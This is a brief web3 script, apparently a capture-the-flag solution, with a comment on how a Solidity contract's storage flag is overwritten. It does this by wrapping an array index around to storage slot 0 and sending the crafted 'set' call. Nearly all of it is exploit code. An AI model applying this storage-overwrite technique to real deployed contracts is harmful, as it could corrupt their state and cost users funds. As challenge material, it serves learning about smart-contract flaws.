/*
	Arrays in storage use the hash of the array position as the starting index for storing elements. This means that we can overflow the index to come back to 0 and modify the 'isComplete' variable to 1. 
*/
abi_mapping = [{"constant":false,"inputs":[{"name":"key","type":"uint256"},{"name":"value","type":"uint256"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"key","type":"uint256"}],"name":"get","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]
contract_mapping = new web3.eth.Contract(abi_mapping, "0x6AC974FB22A39d85E1460FceD01Bb19AAde24BcB")

await contract_mapping.methods.set(String(BigInt(2**256) - BigInt(web3.utils.soliditySha3(1))), 1).send({"from":player})